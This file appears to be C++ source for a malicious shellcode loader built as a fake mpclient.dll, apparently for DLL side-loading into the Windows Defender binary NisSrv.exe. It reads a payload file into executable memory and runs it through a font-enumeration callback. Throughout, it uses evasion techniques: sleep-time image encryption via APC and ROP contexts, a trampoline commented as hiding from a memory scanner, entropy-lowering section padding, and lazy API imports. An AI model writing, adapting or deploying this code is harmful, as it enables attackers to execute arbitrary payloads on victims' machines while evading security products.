// NisSrv.exe - mpclient.dll

#include "pch.h"
#include <windows.h>
#include <iostream>
#include <fstream>
#include "lazy_importer.hpp"
#include <winternl.h>
#include <stdio.h>
#include "sys.h"


#pragma comment (lib, "User32.lib")


template<unsigned int N, typename T, T value>
struct E {
    constexpr E() : array() {
        for (unsigned int i = 0; i < N; i++) {
            array[i] = (T)value;
        }
    }
    T array[N];
};

// https://docs.microsoft.com/en-us/cpp/build/reference/section-specify-section-attributes?view=msvc-170
// allows us to the fix the entropy of any section
#pragma code_seg(".text")
__declspec(allocate(".text"))
constexpr auto e = E<2500, long long, 1>();

#pragma code_seg(".data")
__declspec(allocate(".data"))
constexpr auto e2 = E<2500, long long, 1>();

#pragma code_seg(".rdata")
__declspec(allocate(".rdata"))
constexpr auto e3 = E<2500, long long, 1>();

#pragma code_seg(".pdata")
__declspec(allocate(".rdata"))
constexpr auto e4 = E<2500, long long, 1>();
//
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )


void SleepAPC(DWORD SleepTime)
{
    CONTEXT CtxThread = { 0 };

    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemEnc = { 0 };
    CONTEXT RopDelay = { 0 };
    CONTEXT RopMemDec = { 0 };
    CONTEXT RopProtRX = { 0 };

    HANDLE  hNewWaitObject;
    PVOID   ImageBase = NULL;
    DWORD   ImageSize = 0;
    DWORD   OldProtect = 0;

    CHAR    KeyBuf[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };

    UNICODE_STRING Key = { 0 };
    UNICODE_STRING Img = { 0 };


    PVOID   SysFunc032 = NULL;



    SysFunc032 = GetProcAddress((LoadLibraryA("CRYPTSP.dll"), GetModuleHandleA("CRYPTSP.dll")), "SystemFunction032");

    ImageBase = GetModuleHandleA(NULL);
    ImageSize = ((PIMAGE_NT_HEADERS)((DWORD64)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;


    Key.Buffer = (PWSTR)KeyBuf;
    Key.Length = Key.MaximumLength = 16;

    Img.Buffer = (PWSTR)ImageBase;
    Img.Length = Img.MaximumLength = ImageSize;

    /// Patriot will not find this as RIP will point to this 
    /// allocated heap address
    UCHAR trampo[] = {
    0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xE0
    };
    SIZE_T uSize = sizeof(trampo);
    *(DWORD64*)&trampo[2] = (DWORD64)GetProcAddress(GetModuleHandleA("KERNEL32.dll"), "VirtualProtect");
    LPVOID tramp = VirtualAlloc(NULL, uSize, MEM_COMMIT, PAGE_READWRITE);
    memcpy(tramp, trampo, uSize);
    VirtualProtect(tramp, uSize, PAGE_EXECUTE_READ, &OldProtect);

    OldProtect = 0;


    /// Queue APC to capture current context
    if (QueueUserAPC((PAPCFUNC)RtlCaptureContext, NtCurrentThread(), (ULONG_PTR)&CtxThread))
    {
        /// Alertable state
        SleepEx(0, TRUE);

        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopDelay, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));

        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );


        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = (DWORD64)tramp;
        RopProtRW.Rcx = (DWORD64)ImageBase;
        RopProtRW.Rdx = ImageSize;
        RopProtRW.R8 = PAGE_READWRITE;
        RopProtRW.R9 = (DWORD64)&OldProtect;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp -= 8;
        RopDelay.Rip = (DWORD64)WaitForSingleObject;
        RopDelay.Rcx = (DWORD64)NtCurrentProcess();
        RopDelay.Rdx = SleepTime;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = (DWORD64)tramp;
        RopProtRX.Rcx = (DWORD64)ImageBase;
        RopProtRX.Rdx = ImageSize;
        RopProtRX.R8 = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9 = (DWORD64)&OldProtect;

        // FIFO

        QueueUserAPC((PAPCFUNC)NtContinue, NtCurrentThread(), (DWORD64)&RopProtRW);
        QueueUserAPC((PAPCFUNC)NtContinue, NtCurrentThread(), (DWORD64)&RopDelay);
        QueueUserAPC((PAPCFUNC)NtContinue, NtCurrentThread(), (DWORD64)&RopProtRX);

        // Put alertable
        SleepEx(0, TRUE);
    }

    if (tramp) {
        VirtualFree(tramp, 0, MEM_RELEASE);
    }
}



int Main() {
    unsigned char* decoded;
    HANDLE hInputFile;
    DWORD size, fromsize;

    int total = 0;

    // Use it, pointlessly, or for a reason but don't let it
    // get optimized out by the compiler
    for (auto x : e.array)
        total += x;

    for (auto x : e2.array)
        total += x;

    for (auto x : e3.array)
        total += x;

    for (auto x : e4.array)
        total += x;

    if (__argc <= 1)
    {
        printf("Usage: \"ooooo\" FileName ");
        exit(0);
    }

    hInputFile = CreateFileA(__argv[1],             // open xxxx.bin
        GENERIC_READ,              // open for reading 
        FILE_SHARE_READ,           // share for reading 
        NULL,                      // no security 
        OPEN_EXISTING,             // existing file only 
        FILE_ATTRIBUTE_NORMAL,     // normal file 
        NULL);

    if (hInputFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open input file");
        exit(0);
    }
    size = GetFileSize(hInputFile, nullptr);
    if (size == NULL)
    {
        printf("Failed to query input file size");
        exit(0);
    }



    decoded = (unsigned char*)(malloc)(size);
    //ReadFile(decoded, size, 1, fp);
    ReadFile(hInputFile, decoded, size, &fromsize, NULL);
    LPVOID address = LI_FN(VirtualAlloc)(nullptr, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LI_FN(Sleep)(6000);
    SleepAPC(9 * 1000);
    ::RtlMoveMemory(address, &decoded[0], size);
    printf("[+]%u \n[+]%p", size, static_cast<void*>(&decoded));
    LOGFONTW lf = { 0 };
    lf.lfCharSet = DEFAULT_CHARSET;
    HDC dc = GetDC(NULL);
    LI_FN(EnumFontFamiliesExW)(dc, &lf, (FONTENUMPROCW)address, NULL, NULL);
    return 0, total;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


/*extern "C" __declspec(dllexport) */int MpFreeMemory() { return 0; }
/*extern "C" __declspec(dllexport) */int MpConfigUninitialize() { return 0; }
/*extern "C" __declspec(dllexport) */int MpConfigOpen() { return 0; }
/*extern "C" __declspec(dllexport) */int MpConfigClose() { return 0; }
/*extern "C" __declspec(dllexport) */int MpConfigGetValueAlloc() { return 0; }
/*extern "C" __declspec(dllexport) */int MpHandleClose() { return 0; }
/*extern "C" __declspec(dllexport) */int MpNotificationRegister() { return 0; }
/*extern "C" __declspec(dllexport) */int MpConfigInitialize() { return 0; }
/*extern "C" __declspec(dllexport) */int MpClientUtilExportFunctions() { return 0; }
extern "C" __declspec(dllexport) void MpUtilsExportFunctions(int argc, char* argv[]) { Main(); }
/*extern "C" __declspec(dllexport) */int MpManagerOpen() { return 0; }
int MpConfigGetValue() { return 0; }
int MpDelegateCopyFile() { return 0; }
int MpAllocMemory() { return 0; }
